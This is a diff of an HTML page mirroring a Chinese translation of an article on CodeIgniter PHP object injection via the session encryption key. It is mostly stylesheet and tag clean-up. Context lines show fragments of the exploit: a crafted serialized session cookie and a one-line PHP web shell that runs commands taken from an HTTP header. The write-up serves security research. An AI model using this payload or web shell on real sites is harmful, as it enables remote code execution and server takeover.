@@ -3,16 +3,16 @@
 			<head>
 			     <title>Codeigniter 利用加密Key（密钥）的对象注入漏洞 - lxj616</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/1449">http://drops.wooyun.org/papers/1449</a></h1>
 				
       <p>
-        <p>原文链接：http://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/</p>
+        </p><p>原文链接：http://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/</p>
 
 <h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>大家好，Codeigniter 是我最喜爱的PHP框架之一。和别人一样，我在这个框架中学习了PHP MVC编程。今天，我决定来分析一下Codeigniter的PHP 对象注入漏洞。</p>
 
@@ -22,7 +22,7 @@
 
 <h2>0x01 Codeigniter Session会话机制</h2>
 
-<hr />
+<hr>
 
 <p>Codeigniter 使用PHP的序列化method方法来存储用户Session会话中的变量。但是Codeigniter Session会话机制并不像我们预期的那样工作。它把session会话的变量存在了客户端的cookie里面，大多数是在（服务器）硬盘上而不是用户COOKIE中。我不知道开发者们为什么这么设计。</p>
 
@@ -37,7 +37,7 @@ Session会话class类把每个用户session会话的序列化的（可选加密�
 
 <h2>0x02 Codeigniter Session会话数据结构</h2>
 
-<hr />
+<hr>
 
 <p>让我们开始读点儿代码。但是至此让我解释一下Codeigniter是如何创建session会话并且把变量放进session（-实际上是cookie!-）中的。</p>
 
@@ -202,7 +202,7 @@ adf8a852dafaf46f8c8038256fd0963a = md5('a:1:{s:4:"test";i:1;}'.$this-&gt;encrypt
 
 <h2>0x03 Codeigniter Session会话数据的保存验证</h2>
 
-<hr />
+<hr>
 
 <p>我们知道了CI如何创造cookie数据。现在我们将分析CI的cookie数据验证系统。就像我之前假设的，我们没有一个cookie。这一次我们在HTTP请求中带一个cookie。让我们观察CI是怎样检测并验证cookie的。为了这样做，我们需要理解Session类中的<code>sess_read()</code>方法的代码</p>
 
@@ -358,7 +358,7 @@ function _unserialize($data)
 
 <h2>0x04 概括</h2>
 
-<hr />
+<hr>
 
 <p>在去往exploitation利用部分之前，我希望总结一下我们到现在为止学到的东西</p>
 
@@ -371,7 +371,7 @@ CI通过计算md5来检测用户端的篡改
 
 <h2>0x05 总结</h2>
 
-<hr />
+<hr>
 
 <p>我们遇到了一些障碍</p>
 
@@ -529,7 +529,7 @@ Cookie: ci_session=O%3A16%3A%22Customcacheclass%22%3A2%3A%7Bs%3A3%3A%22dir%22%3B
 
 <pre><code>#!php
 &lt;?php system($_SERVER[HTTP_CMD]);?&gt;
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
